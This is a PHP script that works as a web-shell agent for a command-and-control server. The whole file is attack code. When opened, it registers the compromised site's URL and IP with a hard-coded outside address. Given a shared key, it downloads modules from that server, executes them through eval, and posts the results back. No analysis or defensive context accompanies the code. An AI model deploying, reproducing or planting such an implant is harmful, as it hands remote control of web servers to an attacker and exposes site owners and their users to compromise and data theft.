<?php
$C2_URL = "http://168.144.105.63/c2/";
$AUTH_KEY = "lab123";

// AUTO REGISTER - saat tidak ada parameter module
if (!isset($_GET["module"])) {
    $target_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $register_url = $C2_URL . "?action=auto_register&key=" . $AUTH_KEY;
    
    $postdata = http_build_query([
        "url" => $target_url,
        "name" => $_SERVER["HTTP_HOST"],
        "ip" => $_SERVER["SERVER_ADDR"] ?? gethostbyname($_SERVER["HTTP_HOST"])
    ]);
    
    $opts = ["http" => [
        "method" => "POST",
        "header" => "Content-Type: application/x-www-form-urlencoded",
        "content" => $postdata,
        "timeout" => 10
    ]];
    
    @file_get_contents($register_url, false, stream_context_create($opts));
    echo "Agent registered to C2: " . $target_url;
    exit;
}

// Existing execution logic
if (!isset($_GET["key"]) || $_GET["key"] !== $AUTH_KEY) {
    http_response_code(403);
    die("Invalid");
}

$module = preg_replace("/[^a-zA-Z0-9_-]/", "", $_GET["module"]);
$code_url = $C2_URL . "?action=get_module&key=" . $AUTH_KEY . "&module=" . $module;

$code = @file_get_contents($code_url);
if (!$code) {
    die("Module not found: " . $module);
}

ob_start();
eval("?" . ">" . $code);
$result = ob_get_clean();

$report_url = $C2_URL . "?action=submit_report&key=" . $AUTH_KEY;
$postdata = http_build_query([
    "target" => $_SERVER["HTTP_HOST"],
    "module" => $module,
    "report" => $result
]);

$opts = ["http" => [
    "method" => "POST",
    "header" => "Content-Type: application/x-www-form-urlencoded",
    "content" => $postdata
]];
@file_get_contents($report_url, false, stream_context_create($opts));

echo $result;
?>
